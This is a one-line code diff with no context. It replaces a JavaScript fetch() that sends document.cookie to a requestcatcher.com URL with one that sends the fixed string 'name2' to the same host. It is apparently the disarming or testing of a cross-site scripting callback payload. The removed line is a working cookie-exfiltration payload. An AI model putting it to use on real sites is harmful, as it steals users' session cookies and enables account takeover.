@@ -1,1 +1,1 @@
-fetch(`https://tkjgkrf.requestcatcher.com/${document.cookie}`)
+fetch(`https://tkjgkrf.requestcatcher.com/name2`)
